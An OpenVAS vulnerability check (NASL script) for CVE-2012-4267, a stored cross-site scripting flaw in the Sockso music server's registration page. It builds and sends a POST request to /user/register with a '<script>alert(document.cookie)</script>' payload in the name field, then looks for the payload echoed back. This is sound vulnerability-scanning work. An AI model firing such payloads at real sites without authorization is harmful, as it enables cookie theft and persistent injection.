###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sockso_registration_persistent_xss_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Sockso Registration Persistent Cross Site Scripting Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site.
  Impact Level: Application";
tag_affected = "Sockso version 1.51 and prior";
tag_insight = "The flaw is due to improper validation of user supplied input
  via the 'name' parameter to user or register.";
tag_solution = "No solution or patch is available as of 15th, May 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http: http://sockso.pu-gh.com/";
tag_summary = "The host is running Sockso and is prone to persistent cross site
  scripting vulnerability.";

if(description)
{
  script_id(802853);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2012-4267");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-05-14 13:06:50 +0530 (Mon, 14 May 2012)");
  script_name("Sockso Registration Persistent Cross Site Scripting Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18868");
  script_xref(name : "URL" , value : "http://smwyg.com/blog/#sockso-persistant-xss-attack");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/112647/sockso-xss.txt");

  script_description(desc);
  script_summary("Check if Sockso is vulnerable to Cross Site Scripting");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_require_ports("Services/www", 4444);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
url = "";
port = 0;
req = "";
res = "";
banner = "";
postdata = "";

## Stored XSS (Not a safe check)
if(safe_checks()){
  exit(0);
}

## Get Sockso Port
port = get_http_port(default:4444);
if(!port){
  port = 4444;
}

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Confirm the application before trying exploit
banner = get_http_banner(port: port);
if(!banner || "Server: Sockso" >!< banner){
  exit(0);
}

## Construct attack request
url = "/user/register";
postdata = "todo=register&name="+ rand() + "<script>alert(document.cookie)" +
           "</script>&pass1=abc&pass2=abc&email=xyz"+ rand() +"%40gmail.com";

## Construct POST Attack Request
req = http_post(item:url, port:port, data:postdata);

## Send crafted request and receive the response
res = http_send_recv(port:port, data:req);

## Confirm exploit worked by checking the response
if(res && res =~ "HTTP/1\.[0-9]+ 200" &&
   "<title>Sockso" >< res &&
   "<script>alert(document.cookie)</script>" >< res){
  security_warning(port);
}
